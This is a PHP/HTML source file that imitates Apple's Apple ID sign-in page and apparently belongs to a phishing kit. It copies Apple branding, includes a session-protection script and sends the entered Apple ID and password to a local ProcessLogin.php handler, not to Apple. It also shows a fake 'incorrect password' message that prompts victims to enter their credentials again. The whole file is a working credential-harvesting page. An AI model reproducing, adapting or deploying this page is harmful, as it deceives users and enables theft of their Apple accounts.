<?php

require "includes/session_protect.php";
require "includes/functions.php";
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<link href="css/Fonts.css" rel="prefetch stylesheet" type="text/css">
<link href="css/Login.css" media="screen" rel="stylesheet" type="text/css">
<script>
function ChangePlaceholder(){
document.getElementById("user").placeholder = "name@example.com";
}
function ChangeBack(){
document.getElementById("user").placeholder = "Apple ID";
}
function Activate(){
document.getElementById("go").className = "si-button";
}
function Spinner(){
document.getElementById("go").style.display = "none";
document.getElementById("spin").style.display = "block";
}
</script>
</head>
<body>
<div class="si-body si-container container-fluid" data-theme="lite" id="content">
<div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
<div class="HoldLoginDiv">
<div class="logo"><img style="width: 200px;" class="TextLogo" src="img/logo.png"></div>
<div>
<div class="signin fade-in">
<h1 class="LoginTitkle">Manage your Apple account</h1>
<form action="includes/ProcessLogin.php" name="login" id="name" method="POST" onsubmit="Spinner();">
<div class="container HolderOfTheFields">
<div class="row no-gutter si-field apple-id">
<div class="col-xs-12"><span class="LoginTitle">Manage your Apple account Apple ID</span> <input class="si-text-field" id="user" name="user" onblur="ChangeBack();" onclick="ChangePlaceholder();" placeholder="Apple ID" spellcheck="false" type="email" value="<?php echo $_SESSION['user'];?>"></div>
</div>
<div class="row no-gutter si-field pwd">
<div class="col-xs-12"><label class="LoginTitle" for="pwd">Password</label> <input class="si-password si-text-field" id="pass" name="pass" onkeyup="Activate();" placeholder="Password" type="password">
</div>
</div>

<div class="pop-container error signin-error ">
            <div class="error pop-bottom">
                <p class="fat" id="errMsg">
                    Your Apple&nbsp;ID or password was incorrect.
                </p>
                    <a target="blank" class="si-link ax-outline thin" href="https://iforgot.apple.com/password/verify/appleid">
                        Forgot password?
                    </a>
            </div>
        </div>

<div class="si-remember-password"><input class="ax-outline" tabindex="0" type="checkbox"> <label for="remember-me">Remember me</label></div>
<div class="spinner-container auth hide"></div>
<button class="si-button btn disabled" id="go" tabindex="0"><i class="icon icon_sign_in"></i></button>
<button style="display:none;" class="si-button btn" id="spin" tabindex="0"><img style="margin-top:-2px" src="img/spinner.gif"></span></button>
</div>
</form>
<div class="si-container-footer"></div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>